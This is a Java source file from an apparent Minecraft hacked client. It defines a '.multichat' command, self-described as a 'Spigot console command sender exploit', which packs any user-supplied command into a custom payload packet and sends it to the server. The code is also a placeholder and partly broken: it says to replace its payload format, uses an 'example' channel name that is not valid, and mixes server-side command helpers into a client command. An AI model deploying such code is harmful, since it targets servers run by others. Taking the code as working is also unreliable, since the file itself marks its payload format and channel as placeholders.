package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientCommandSource;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.registry.Registry;
import net.minecraft.command.CommandSource;
import net.minecraft.command.argument.ArgumentTypes;

import static net.minecraft.server.command.CommandManager.literal;
import static net.minecraft.server.command.CommandManager.argument;

import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.netty.buffer.Unpooled;

public class Multichat extends Command {

    public Multichat(MinecraftClient minecraftClient) {
        super("multichat", "Spigot console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<ClientCommandSource> build() {
        return literal(this.getName())
            .executes(this::onEmpty)
            .then(argument("command", StringArgumentType.greedyString())
                .executes(this::sendPayload));
    }

    private int onEmpty(CommandContext<ClientCommandSource> context) {
        Helper.printChatMessage("Usage: .multichat <command>");
        return 1;
    }

    private int sendPayload(CommandContext<ClientCommandSource> context) {
        String command = context.getArgument("command", String.class);
        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());

        // Replace with actual payload format
        buf.writeString(command);

        Identifier channel = new Identifier("MC|BSign"); // Example custom channel
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(channel, buf);
        Helper.sendPacket(packet);

        Helper.printChatMessage("Payload sent!");
        return 1;
    }
}
